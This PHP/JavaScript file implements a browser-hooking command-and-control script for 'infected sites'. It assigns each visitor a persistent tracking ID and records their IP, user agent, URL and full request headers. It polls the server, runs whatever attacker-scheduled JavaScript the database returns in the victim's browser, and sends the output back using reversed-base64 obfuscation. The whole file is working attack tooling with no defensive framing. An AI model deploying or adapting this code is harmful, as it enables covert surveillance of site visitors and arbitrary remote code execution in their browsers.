<?php
if (isset($_GET['test'])) exit("alert(1);"); //Testing
/** CONFIGURATION **/
$SCRIPT_RELOAD_TIME = 6; //in seconds. This time represent the interval for the polling (from the client to the server).
$LOG_PATH = 'log.txt'; //Change this name and put the log in a protect folder
$SCRIPT_PATH = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']; //the full path of this script (protocol+site+path, e.g. http://mysite/getjs.php)
?>
function sendUpdate() {
    if (readCookie('_uidku') != 'up'){
        data="updateme";
        createCookie('_uidku', 'up', 1);
    }
}

function getUserID() { //Check if the user is already registered
    return (readCookie('_uidk') || localStorage.getItem('_uidk'));
}

function registerUser() {
    var uid=Math.floor(Math.random() * (1000000 - 100000) + 100000);
    createCookie('_uidk', uid, 365);
    createCookie('_uidku', 'up', 1);
    if(typeof(Storage) !== "undefined")
        localStorage.setItem('_uidk', uid);
    return uid;
}

function createCookie(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) {
	createCookie(name,"",-1);
}

function encode(str) {
    return btoa(str).split('').reverse().join('');
}

function decode(str) {
    return atob(str.split('').reverse().join(''));
}

function reloadjs(uid, data)
{
      var body=document.body;
      try{ body.removeChild(document.getElementById('scr72')); } catch (e) {}
      var script= document.createElement('script');
      script.type= 'text/javascript';
      script.src= '<?php echo $SCRIPT_PATH; ?>?r=<?php echo rand(0,100000); ?>&uid='+uid+'&data='+encode(encodeURI(data));
      script.id='scr72';
      body.appendChild(script);
}

var data="";
var uid = getUserID();
if (uid == null) {
    uid = registerUser();
    data = "registerme";
    uid = uid+"&url="+document.location.href;
}
sendUpdate();

document.body.onload = function() { uid+="&s=online"; }
document.body.onbeforeunload = function() { uid+="&s=offline";reloadjs(uid,data);}
<?php
if (isset($_GET['uid'])) {
    define('allowed',true);
    include('db.php');
    $uid = (int) $_GET['uid']; //This number identify a visitor of a certain site (if the same user visit another infected site he'll have another uid)
    $data = sanitize(base64_decode(strrev($_GET['data'])));
    //Register the user
    if ($data == "registerme")
        registerUser($uid, sanitize($_GET['url']),$mysqli);
    elseif ($data == "updateme")
        updateUser($uid,$mysqli);
    else {
        if ($data != "") { //if there is a response from a previous command..
            //Save the response into the db
            if ($res = $mysqli->query("SELECT * FROM schedules WHERE uid=".$uid." AND executed=1 AND response IS NULL ORDER BY date ASC;")) {
                if ($res->num_rows > 0) {
                    $res->data_seek(0);
                    $row = $res->fetch_assoc();
                    $mysqli->query("UPDATE schedules SET response='".$data."',responsedate='".date("Y-m-d H:i:s")."' WHERE id=".$row['id'].";");
                }
                $res->close();
            }else
                logErr("Failed to save response for the user ".$uid);
        }
    }
    //Check for a schedule
    if ($res = $mysqli->query("SELECT schedules.id as sid, schedules.*,functions.* FROM schedules,functions WHERE (uid=".$uid." OR uid=0) AND executed=0 AND schedules.fid=functions.id ORDER BY date ASC;")) {
        if ($res->num_rows > 0) {
            $res->data_seek(0);
            $row = $res->fetch_assoc();
            $mysqli->query("UPDATE schedules SET executed=1,uid=".$uid." WHERE id=".$row['sid'].";");
            echo "try { ".$row['code']." }catch(e){ data='Error: '+e.message;}";
        }
        $res->close();
    }else
        logErr("Failed to get schedules for the user ".$uid);
            
    if ($_GET['s'] == "online") setStatus($uid,1,$mysqli); elseif ($_GET['s'] == "offline") setStatus($uid,0,$mysqli);
    $mysqli->close();
}

echo "setTimeout(function(){reloadjs(uid,data);},".($SCRIPT_RELOAD_TIME*1000).");";

function setStatus($uid,$status,$mysqli) {
    $lastonline="";
    if ($status==1) $lastonline=",lastonline='".date("Y-m-d H:i:s")."'";
    if ($mysqli->query("UPDATE users SET status=".$status.$lastonline." WHERE id=".$uid.";") === FALSE)
        logErr("Failed to update the status of the user [".$ip."]");
}

function registerUser($uid, $url, $mysqli) {
    $ip = getUserIP();
    $ua = sanitize($_SERVER['HTTP_USER_AGENT']);
    $hd = getHeaders();
    $d = date("Y-m-d H:i:s");
    if ($mysqli->query("INSERT INTO users (id,ip,ua,url,regdate,lastupdate,status,lastonline,headers) VALUES (".$uid.",'".$ip."', '".$ua."', '".$url."','".$d."','".$d."',1,'".$d."','".$hd."');") === FALSE)
        logErr("Failed to register a new user [".$ip."]");
}

function updateUser($uid, $mysqli) { //TODO save an history of (different) ip and ua for each user
    $ip = getUserIP();
    $ua = sanitize($_SERVER['HTTP_USER_AGENT']);
    $hd = getHeaders();
    $d = date("Y-m-d H:i:s");
    if ($mysqli->query("UPDATE users SET ip='".$ip."', ua='".$ua."',lastupdate='".$d."',status=1,lastonline='".$d."',headers='".$hd."' WHERE id=".$uid.";") === FALSE)
        logErr("Failed to update information of the user [".$ip."]");
}

function getHeaders() {
    $headers="";
    foreach (getallheaders() as $name => $value) {
        $headers .= sanitize("$name: $value\n");
    }
    return $headers;
}

function getUserIP() {
    if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
            $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($addr[0]);
        } else {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function sanitize($string) {
    $string = str_replace("'", "\\'",$string);
    return htmlentities($string);
}

function logErr($message) {
    $fp = fopen($LOG_PATH, "a");
    fwrite($fp, date("d/m/Y h:i")." - ".$message."\n");
    fclose($fp);
}

//TODO: old function, maybe I can remove this
function getLoc($url) {
    $url = str_replace("http://","",$url,$count);
    if ($count==0)
        $url = str_replace("https://","",$url);
    $url = str_replace("www.","",$url);
    return explode("/",$url,2);
}
?>
